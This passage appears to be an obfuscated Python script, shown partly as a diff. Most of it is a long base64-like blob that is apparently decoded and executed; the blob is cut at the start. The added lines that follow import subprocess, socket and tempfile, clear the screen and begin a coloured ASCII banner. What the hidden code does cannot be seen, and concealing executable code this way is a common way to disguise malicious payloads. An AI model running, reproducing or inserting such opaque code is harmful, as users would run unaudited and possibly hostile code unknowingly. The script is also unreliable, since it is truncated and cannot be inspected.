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'))
+import sys
+import subprocess
+import os
+import tempfile
+import shutil
+import re
+import codecs
+import socket
+import pathlib
+import time
+from datetime import datetime
+import collections
+import statistics
+import csv
+from typing import Dict
+os.system('clear')   
+logo = ("""
+ \033[1;31m(                      )    (        )               
+\033[1;31m )\ )          (     ( /(    )\ )  ( /(               
+\033[1;31m(()/(    (     )\    )\())  (()/(  )\()) (   (   (    
+\033[1;31m /(_))   )\  (((_) |((_)\    /(_))((_)\  )\  )\  )\   
